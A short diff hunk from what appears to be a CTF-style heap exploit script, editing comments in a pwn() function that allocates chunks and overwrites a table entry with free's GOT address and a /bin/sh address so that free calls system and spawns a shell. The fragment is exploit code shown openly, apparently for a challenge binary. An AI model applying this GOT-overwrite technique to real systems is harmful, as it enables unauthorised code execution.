@@ -80,7 +80,8 @@ def pwn():
     alloc(0x68, payload)
     alloc(0x68, "F")
     alloc(0x68, "G")
-    # overwrite the 0th entry with free's got entry
+    # overwrite the 1st entry with free's got entry
+    # and the 2nd entry with binsh's address
     alloc(0x68,"H"*0x13 + p64(free_got) + p64(binsh))
 
     # free => system
